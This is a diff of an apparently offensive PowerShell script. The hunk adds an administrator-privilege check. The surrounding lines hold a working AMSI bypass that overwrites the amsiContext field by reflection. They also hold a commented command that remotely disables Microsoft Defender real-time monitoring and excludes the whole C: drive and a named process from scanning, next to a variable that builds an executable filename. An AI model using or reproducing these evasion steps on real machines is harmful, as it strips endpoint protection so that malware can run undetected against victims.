@@ -19,6 +19,11 @@ $ACACAC = "$file.exe"
 # AMSI Bypass
 [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
 
+#checks if Admin
+if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Write-Warning "Please run this script as an Administrator!"
+    Exit
+}
 
 # Disables Defender Real Time Monitoring 
 #non-obfuscated command: Invoke-Command -ComputerName %s -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\'; Add-MpPreference -ExclusionProcess '%s' }
